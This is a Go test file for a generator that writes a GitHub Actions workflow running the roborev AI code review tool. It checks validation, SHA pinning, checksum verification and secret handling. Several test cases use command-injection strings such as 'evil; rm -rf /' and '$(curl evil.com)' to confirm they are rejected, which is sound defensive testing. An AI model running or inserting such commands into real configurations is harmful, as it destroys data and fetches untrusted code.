package ghaction

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	if len(cfg.Agents) != 1 || cfg.Agents[0] != "codex" {
		t.Errorf(
			"expected default agents [codex], got %v",
			cfg.Agents)
	}
}

func TestValidate(t *testing.T) {
	tests := []struct {
		name    string
		cfg     WorkflowConfig
		wantErr string
	}{
		{
			name: "valid default",
			cfg:  DefaultConfig(),
		},
		{
			name: "valid multi-agent",
			cfg: WorkflowConfig{
				Agents: []string{"codex", "claude-code"},
			},
		},
		{
			name:    "invalid agent",
			cfg:     WorkflowConfig{Agents: []string{"evil; rm -rf /"}},
			wantErr: "invalid agent",
		},
		{
			name:    "empty agents",
			cfg:     WorkflowConfig{Agents: []string{}},
			wantErr: "at least one agent",
		},
		{
			name: "invalid version",
			cfg: WorkflowConfig{
				Agents:         []string{"codex"},
				RoborevVersion: "$(curl evil.com)",
			},
			wantErr: "invalid roborev version",
		},
		{
			name: "valid version",
			cfg: WorkflowConfig{
				Agents:         []string{"codex"},
				RoborevVersion: "0.33.1",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.cfg.Validate()
			if tt.wantErr != "" {
				if err == nil {
					t.Fatal("expected error")
				}
				if !strings.Contains(
					err.Error(), tt.wantErr) {
					t.Errorf(
						"error %q should contain %q",
						err.Error(), tt.wantErr)
				}
			} else if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
		})
	}
}

func TestGenerate_DefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	checks := []string{
		"name: roborev",
		"pull_request:",
		"Install roborev",
		"Install agents",
		"Run review",
		"roborev ci review",
		"--ref",
		"--comment",
		"--gh-repo",
		"--pr",
		"OPENAI_API_KEY",
		"actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
		"sha256sum --check",
		"set -euo pipefail",
		"@openai/codex@latest",
	}
	for _, check := range checks {
		if !strings.Contains(out, check) {
			t.Errorf("output missing %q", check)
		}
	}

	// Verify no old patterns
	broken := []string{
		"--commit",
		"--format json",
		"comment --pr",
		"actions/checkout@v4",
		"--local",
		"--agent codex",
		"Post results",
	}
	for _, b := range broken {
		if strings.Contains(out, b) {
			t.Errorf("output should not contain %q", b)
		}
	}
}

func TestGenerate_MultiAgent(t *testing.T) {
	cfg := WorkflowConfig{
		Agents: []string{"codex", "claude-code"},
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	// Both agents should be installed
	if !strings.Contains(out, "@openai/codex@latest") {
		t.Error("expected codex install command")
	}
	if !strings.Contains(
		out, "@anthropic-ai/claude-code@latest") {
		t.Error("expected claude-code install command")
	}

	// Both env vars should be present
	if !strings.Contains(out, "OPENAI_API_KEY") {
		t.Error("expected OPENAI_API_KEY")
	}
	if !strings.Contains(out, "ANTHROPIC_API_KEY") {
		t.Error("expected ANTHROPIC_API_KEY")
	}
}

func TestGenerate_ClaudeAgent(t *testing.T) {
	cfg := WorkflowConfig{
		Agents: []string{"claude-code"},
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "ANTHROPIC_API_KEY") {
		t.Error("expected ANTHROPIC_API_KEY")
	}
	if !strings.Contains(
		out, "@anthropic-ai/claude-code@latest") {
		t.Error("expected claude-code install command")
	}
}

func TestGenerate_GeminiAgent(t *testing.T) {
	cfg := WorkflowConfig{
		Agents: []string{"gemini"},
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "GOOGLE_API_KEY") {
		t.Error("expected GOOGLE_API_KEY for gemini")
	}
	if !strings.Contains(
		out, "@google/gemini-cli@latest") {
		t.Error("expected gemini install command")
	}
}

func TestGenerate_CopilotAgent(t *testing.T) {
	cfg := WorkflowConfig{
		Agents: []string{"copilot"},
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(
		out, "@github/copilot@latest") {
		t.Error("expected copilot install command")
	}

	// GH_TOKEN should be present (hardcoded in template)
	if !strings.Contains(out, "GH_TOKEN:") {
		t.Error("expected GH_TOKEN in env block")
	}

	// There should be NO bare GITHUB_TOKEN: entry in the
	// env block — copilot's token comes from the hardcoded
	// GH_TOKEN line, not a separate secret.
	envSection := extractEnvSection(out)
	if strings.Contains(envSection, "GITHUB_TOKEN:") {
		t.Error(
			"env block should not contain bare " +
				"GITHUB_TOKEN: entry for copilot")
	}
}

func TestGenerate_PinnedVersion(t *testing.T) {
	cfg := DefaultConfig()
	cfg.RoborevVersion = "0.33.1"
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(
		out, `ROBOREV_VERSION="0.33.1"`) {
		t.Error("expected pinned version in output")
	}
	if strings.Contains(out, "api.github.com") {
		t.Error(
			"pinned version should not query GitHub API")
	}
}

func TestGenerate_LatestVersion(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "api.github.com") {
		t.Error(
			"expected GitHub API call for latest version")
	}
}

func TestGenerate_EmptyFields(t *testing.T) {
	cfg := WorkflowConfig{}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "OPENAI_API_KEY") {
		t.Error("expected default codex env var")
	}
	if !strings.Contains(
		out, "@openai/codex@latest") {
		t.Error("expected default codex install")
	}
}

func TestGenerate_DedupesEnvVars(t *testing.T) {
	// codex and opencode both use OPENAI_API_KEY
	cfg := WorkflowConfig{
		Agents: []string{"codex", "opencode"},
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	// Both should be installed
	if !strings.Contains(
		out, "@openai/codex@latest") {
		t.Error("expected codex install")
	}
	if !strings.Contains(
		out, "opencode-ai/opencode@latest") {
		t.Error("expected opencode install")
	}

	// OPENAI_API_KEY should appear in env block only once
	// (deduped by env var). Count lines that define the key.
	envSection := extractEnvSection(out)
	count := strings.Count(
		envSection, "OPENAI_API_KEY:")
	if count != 1 {
		t.Errorf(
			"expected 1 OPENAI_API_KEY: in env, got %d",
			count)
	}
}

func TestGenerate_SupplyChainHardening(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if strings.Contains(out, "actions/checkout@v4") {
		t.Error(
			"checkout should be pinned to SHA, not tag")
	}
	if !strings.Contains(
		out, "actions/checkout@"+
			"de0fac2e4500dabe0009e67214ff5f5447ce83dd") {
		t.Error("checkout should be pinned to SHA")
	}
	if !strings.Contains(out, "sha256sum --check") {
		t.Error(
			"expected checksum verification for download")
	}
	if strings.Contains(out, "--ignore-missing") {
		t.Error(
			"should not use --ignore-missing")
	}
	if !strings.Contains(
		out, `grep -F "  ${ARCHIVE}" checksums.txt`) {
		t.Error(
			"expected grep -F to extract matching checksum")
	}
}

func TestGenerate_InstallPath(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if strings.Contains(out, "/usr/local/bin") {
		t.Error(
			"should not install to /usr/local/bin")
	}
	if !strings.Contains(out, `"$HOME/.local/bin"`) {
		t.Error(
			"expected install to $HOME/.local/bin")
	}
	if !strings.Contains(out, "$GITHUB_PATH") {
		t.Error(
			"expected .local/bin added to GITHUB_PATH")
	}
	if !strings.Contains(
		out, `"$HOME/.local/bin/roborev" version`) {
		t.Error(
			"expected explicit path for roborev version check " +
				"(GITHUB_PATH not available in same step)")
	}
}

func TestGenerate_VersionPinningComment(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(
		out, "Pin agent CLI versions") {
		t.Error(
			"expected version pinning comment")
	}
}

func TestGenerate_UsesRoborevCIReview(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "roborev ci review") {
		t.Error("expected 'roborev ci review' command")
	}
	if strings.Contains(out, "roborev review --local") {
		t.Error(
			"should NOT contain old per-commit review")
	}
}

func TestAgentInstallCmd_CorrectPackageNames(t *testing.T) {
	tests := []struct {
		agent       string
		wantPkg     string
		notWantPkgs []string
	}{
		{
			agent:   "gemini",
			wantPkg: "@google/gemini-cli",
			notWantPkgs: []string{
				"@anthropic-ai/gemini",
			},
		},
		{
			agent:   "claude-code",
			wantPkg: "@anthropic-ai/claude-code",
		},
		{
			agent:   "codex",
			wantPkg: "@openai/codex",
		},
		{
			agent:   "copilot",
			wantPkg: "@github/copilot",
			notWantPkgs: []string{
				"gh extension install",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			cmd := AgentInstallCmd(tt.agent)
			if !strings.Contains(cmd, tt.wantPkg) {
				t.Errorf(
					"AgentInstallCmd(%q) = %q, "+
						"want package %q",
					tt.agent, cmd, tt.wantPkg)
			}
			for _, bad := range tt.notWantPkgs {
				if strings.Contains(cmd, bad) {
					t.Errorf(
						"AgentInstallCmd(%q) = %q, "+
							"should NOT contain %q",
						tt.agent, cmd, bad)
				}
			}
		})
	}
}

func TestGenerate_Injection_Rejected(t *testing.T) {
	tests := []struct {
		name string
		cfg  WorkflowConfig
	}{
		{
			name: "agent injection",
			cfg: WorkflowConfig{
				Agents: []string{"codex; rm -rf /"},
			},
		},
		{
			name: "version injection",
			cfg: WorkflowConfig{
				Agents:         []string{"codex"},
				RoborevVersion: "1.0.0$(curl evil)",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Generate(tt.cfg)
			if err == nil {
				t.Fatal(
					"expected Generate to reject config")
			}
		})
	}
}

func TestWriteWorkflow_CreatesFile(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(
		dir, ".github", "workflows", "roborev.yml")

	cfg := DefaultConfig()
	if err := WriteWorkflow(
		cfg, outPath, false); err != nil {
		t.Fatalf("WriteWorkflow failed: %v", err)
	}

	content, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatalf("read file: %v", err)
	}
	if !strings.Contains(
		string(content), "name: roborev") {
		t.Error("written file should contain workflow name")
	}
}

func TestWriteWorkflow_ExistingFile_NoForce(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, "roborev.yml")

	if err := os.WriteFile(
		outPath, []byte("existing"), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := DefaultConfig()
	err := WriteWorkflow(cfg, outPath, false)
	if err == nil {
		t.Fatal(
			"expected error for existing file without --force")
	}
	if !strings.Contains(
		err.Error(), "already exists") {
		t.Errorf(
			"expected 'already exists' error, got: %v",
			err)
	}

	content, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(content) != "existing" {
		t.Error(
			"existing file content should be preserved")
	}
}

func TestWriteWorkflow_ExistingFile_Force(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, "roborev.yml")

	if err := os.WriteFile(
		outPath, []byte("existing"), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := DefaultConfig()
	if err := WriteWorkflow(
		cfg, outPath, true); err != nil {
		t.Fatalf("WriteWorkflow with force failed: %v", err)
	}

	content, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(content) == "existing" {
		t.Error(
			"force should have overwritten existing content")
	}
	if !strings.Contains(
		string(content), "name: roborev") {
		t.Error(
			"overwritten file should contain workflow name")
	}
}

func TestAgentEnvVar(t *testing.T) {
	tests := []struct {
		agent string
		want  string
	}{
		{"codex", "OPENAI_API_KEY"},
		{"claude-code", "ANTHROPIC_API_KEY"},
		{"gemini", "GOOGLE_API_KEY"},
		{"copilot", "GITHUB_TOKEN"},
		{"opencode", "OPENAI_API_KEY"},
		{"droid", "OPENAI_API_KEY"},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			got := AgentEnvVar(tt.agent)
			if got != tt.want {
				t.Errorf(
					"AgentEnvVar(%q) = %q, want %q",
					tt.agent, got, tt.want)
			}
		})
	}
}

func TestAgentInstallCmd(t *testing.T) {
	tests := []struct {
		agent    string
		contains string
	}{
		{"codex", "npm install -g @openai/codex@latest"},
		{"claude-code",
			"npm install -g @anthropic-ai/claude-code@latest"},
		{"copilot", "npm install -g @github/copilot@latest"},
		{"cursor", "not available in CI"},
		{"gemini", "npm install -g @google/gemini-cli@latest"},
		{"droid", "droid-cli"},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			got := AgentInstallCmd(tt.agent)
			if !strings.Contains(got, tt.contains) {
				t.Errorf(
					"AgentInstallCmd(%q) = %q, "+
						"want to contain %q",
					tt.agent, got, tt.contains)
			}
		})
	}
}

func TestAgentSecrets(t *testing.T) {
	t.Run("single agent", func(t *testing.T) {
		secrets := AgentSecrets([]string{"codex"})
		if len(secrets) != 1 {
			t.Fatalf("expected 1 secret, got %d",
				len(secrets))
		}
		if secrets[0].EnvVar != "OPENAI_API_KEY" {
			t.Errorf(
				"expected OPENAI_API_KEY, got %q",
				secrets[0].EnvVar)
		}
	})

	t.Run("dedupes by env var", func(t *testing.T) {
		secrets := AgentSecrets(
			[]string{"codex", "opencode"})
		if len(secrets) != 1 {
			t.Fatalf(
				"expected 1 deduped secret, got %d",
				len(secrets))
		}
	})

	t.Run("multi env var", func(t *testing.T) {
		secrets := AgentSecrets(
			[]string{"codex", "claude-code"})
		if len(secrets) != 2 {
			t.Fatalf("expected 2 secrets, got %d",
				len(secrets))
		}
	})

	t.Run("copilot alone produces empty list",
		func(t *testing.T) {
			secrets := AgentSecrets(
				[]string{"copilot"})
			if len(secrets) != 0 {
				t.Fatalf(
					"expected 0 secrets for copilot "+
						"alone, got %d", len(secrets))
			}
		})

	t.Run("copilot plus codex only codex secret",
		func(t *testing.T) {
			secrets := AgentSecrets(
				[]string{"copilot", "codex"})
			if len(secrets) != 1 {
				t.Fatalf(
					"expected 1 secret, got %d",
					len(secrets))
			}
			if secrets[0].EnvVar != "OPENAI_API_KEY" {
				t.Errorf(
					"expected OPENAI_API_KEY, got %q",
					secrets[0].EnvVar)
			}
		})
}

// extractEnvSection extracts the env: block from workflow YAML.
func extractEnvSection(yaml string) string {
	start := strings.Index(yaml, "env:")
	if start < 0 {
		return ""
	}
	end := strings.Index(yaml[start:], "run:")
	if end < 0 {
		return yaml[start:]
	}
	return yaml[start : start+end]
}
